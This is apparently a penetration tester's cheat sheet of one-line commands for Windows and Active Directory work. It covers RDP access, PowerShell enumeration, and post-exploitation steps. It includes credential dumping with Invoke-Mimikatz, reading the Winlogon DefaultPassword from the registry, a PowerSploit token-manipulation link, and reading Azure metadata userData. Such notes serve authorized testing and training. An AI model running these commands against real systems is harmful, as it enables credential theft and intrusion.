xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share ***RDP***

$ErrorActionPreference= 'silentlycontinue' ***Hide Error in PowerShell***

Get-UserProperty -Properties logoncount | Where logoncount -ne 0 ***Filtering Powershell objects***

Get-ObjectAcl -SamAccountName Control174User –ResolveGUIDs | Where-Object {$_.IdentityReference -like "RDP*"} ***Filtering Powershell objects***

Token impersonation is now a part of Powersploit https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DefaultPassword" ***Creds***

Invoke-Mimikatz -DumpCreds/-DumpCerts

script -qc /bin/bash /dev/null

Service Ticket Combos - https://adsecurity.org/?p=2011

proxychains net time set -S 172.16.3.5

(get-azvm | select -ExpandProperty networkprofile).NetworkInterfaces.id ***Expand Property***

$userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text";[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData)) 
